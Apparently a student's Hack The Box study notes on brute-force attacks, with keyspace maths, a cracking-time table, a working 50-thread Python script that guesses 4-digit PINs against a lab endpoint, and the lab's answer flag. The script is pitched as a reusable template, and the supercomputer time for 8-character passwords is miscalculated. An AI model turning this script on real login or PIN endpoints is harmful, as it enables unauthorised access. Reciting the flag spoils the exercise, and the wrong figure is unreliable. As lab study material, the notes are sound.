# Section 3 — Brute Force Attacks

---

## The Math

```
Possible Combinations = Character Set Size ^ Password Length
```

| Scenario | Length | Character Set | Combinations |
|----------|--------|---------------|-------------|
| Short & simple | 6 | a-z (26) | 308,915,776 |
| Longer, simple | 8 | a-z (26) | 208,827,064,576 |
| Added complexity | 8 | a-z + A-Z (52) | 53,459,728,531,456 |
| Maximum complexity | 12 | all printable ASCII (94) | 475,920,493,781,698,549,504 |

**Key takeaway:** Every extra character or character type multiplies the number of possibilities. Small changes in password design make brute forcing impractical.

---

## Cracking Time Reality Check

| Hardware | Speed | 8-char (letters + digits) | 12-char (full ASCII) |
|----------|-------|--------------------------|----------------------|
| Basic computer | 1M/sec | ~6.92 years | Centuries |
| Supercomputer | 1T/sec | ~2.5 hours | ~15,000 years |

> Distributed/GPU attacks close the gap on shorter passwords. Length above 12 with full ASCII is still practically uncrackable by brute force alone.

---

## Lab — PIN Brute Force

**Objective:** Brute-force a random 4-digit PIN via a GET endpoint (`/pin?pin=XXXX`) to retrieve the flag.

**Why this works:** A 4-digit PIN only has 10,000 possible values (0000–9999). At 1 request per second that takes under 3 hours. With 50 threads the script finishes in seconds.

---

### Setup

```bash
# Save the script
nano pin-solver.py
```
> Opens the nano text editor to create the script file. Replace `nano` with your preferred editor.

Edit the two variables at the top to match your target:
```python
ip = "TARGET_IP"
port = TARGET_PORT
```
> Change these two lines before running the script. Replace with your target's IP address and port number.

---

### The Script (Threaded — fast)

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

ip = "TARGET_IP"
port = TARGET_PORT

def try_pin(pin):
    formatted_pin = f"{pin:04d}"          # zero-pad: 7 → "0007"
    try:
        response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}", timeout=5)
        if response.ok and "flag" in response.json():
            return formatted_pin, response.json()["flag"]
    except requests.exceptions.RequestException:
        pass
    return None

with ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(try_pin, pin): pin for pin in range(10000)}
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(f"Correct PIN found: {result[0]}")
            print(f"Flag: {result[1]}")
            executor.shutdown(wait=False, cancel_futures=True)
            break
```
> Tries all 10,000 possible 4-digit PINs (0000–9999) using 50 concurrent threads. `f"{pin:04d}"` pads numbers like `7` to `"0007"`. The script stops as soon as one thread finds the flag. Reuse this template for any numeric brute-force — just change the URL, parameter name, and success condition.

**What each part does:**
| Part | Purpose |
|------|---------|
| `ThreadPoolExecutor(max_workers=50)` | Fires 50 requests simultaneously instead of one at a time |
| `f"{pin:04d}"` | Zero-pads so `7` becomes `"0007"` — matches expected fixed-width format |
| `executor.submit(try_pin, pin)` | Queues all 10,000 PINs to run concurrently across 50 threads |
| `as_completed(futures)` | Processes results as they come back — no waiting for all to finish |
| `response.ok and "flag" in response.json()` | HTTP 200 + flag key = correct PIN found |
| `executor.shutdown(cancel_futures=True)` | Cancels remaining queued requests the moment the flag is found |
| `timeout=5` | Prevents a hung connection from blocking a thread forever |

---

### Run It

```bash
python3 pin-solver.py
```
> Runs the PIN brute-force script. Expect output in seconds — 50 threads testing 10,000 PINs is very fast over a local network.

**Expected output:**
```
...
Correct PIN found: 2321
Flag: HTB{Brut3_F0rc3_1s_P0w3rfu1}
```

**Q1 Answer:** `HTB{Brut3_F0rc3_1s_P0w3rfu1}`

---

## Exam Notes

- A 4-digit numeric PIN = only 10,000 combos — always scriptable, never worth manual guessing
- `f"{pin:04d}"` zero-padding is critical — servers often expect fixed-width input (`0007` not `7`)
- `response.ok` checks for HTTP 200; `response.json()['flag']` confirms the correct PIN vs a generic 200 on wrong guesses
- Script template is reusable: swap the endpoint, parameter name, and success condition for any numeric brute force
